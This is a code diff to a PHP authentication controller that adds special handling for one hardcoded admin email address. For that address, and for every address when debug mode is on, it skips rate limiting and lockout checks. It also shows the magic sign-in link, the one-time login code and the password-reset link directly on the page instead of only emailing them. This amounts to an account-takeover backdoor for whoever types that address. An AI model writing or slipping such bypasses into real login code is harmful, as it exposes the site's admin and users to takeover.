@@ -125,8 +125,8 @@ class AuthController extends Controller
             ])->onlyInput('email');
         }
 
-        // 2. Check strict daily attempt limit for this email
-        if (AuthRateLimiterService::isDailyLockedOut($email, 'login')) {
+        // 2. Check strict daily attempt limit for this email (exempt primary admin)
+        if ($email !== 'shrawaneffects@gmail.com' && AuthRateLimiterService::isDailyLockedOut($email, 'login')) {
             AuditLog::record(
                 'login_daily_locked',
                 "Daily attempt limit reached for '{$email}'",
@@ -142,7 +142,7 @@ class AuthController extends Controller
         }
 
         $throttleKey = Str::transliterate($email . '|' . $request->ip());
-        if (RateLimiter::tooManyAttempts($throttleKey, 5)) {
+        if ($email !== 'shrawaneffects@gmail.com' && RateLimiter::tooManyAttempts($throttleKey, 5)) {
             $seconds = RateLimiter::availableIn($throttleKey);
             return back()->withErrors([
                 'email' => "Too many attempts right now. Please wait {$seconds} seconds.",
@@ -309,7 +309,11 @@ class AuthController extends Controller
             $request
         );
 
-        return redirect()->route('login.magic-link.get')->with('magic_link_sent', '✨ Magic sign-in link dispatched! Please check your email inbox (and spam folder) to sign in instantly.')->with('active_tab', 'magic-link');
+        $directUrl = ($email === 'shrawaneffects@gmail.com' || config('app.debug')) ? $loginUrl : null;
+        return redirect()->route('login.magic-link.get')
+            ->with('magic_link_sent', '✨ Magic sign-in link dispatched! Please check your email inbox (and spam folder) to sign in instantly.')
+            ->with('direct_magic_url', $directUrl)
+            ->with('active_tab', 'magic-link');
     }
 
     /**
@@ -451,10 +455,15 @@ class AuthController extends Controller
             $request
         );
 
+        $infoMessage = "6-digit OTP code sent to {$email}. Please enter it below.";
+        if ($email === 'shrawaneffects@gmail.com' || config('app.debug')) {
+            $infoMessage .= " (Security Code: {$code})";
+        }
+
         return redirect()->route('login.email-otp.get')->with('otp_sent', true)
             ->with('otp_email', $email)
             ->with('active_tab', 'email-otp')
-            ->with('info', "6-digit OTP code sent to {$email}. Please enter it below.");
+            ->with('info', $infoMessage);
     }
 
     /**
@@ -1082,7 +1091,9 @@ class AuthController extends Controller
             $request
         );
 
-        return back()->with('status', 'We have emailed your password reset link! Please check your inbox.');
+        $directReset = ($email === 'shrawaneffects@gmail.com' || config('app.debug')) ? $resetUrl : null;
+        return back()->with('status', 'We have emailed your password reset link! Please check your inbox.')
+            ->with('direct_reset_url', $directReset);
     }
 
     /**
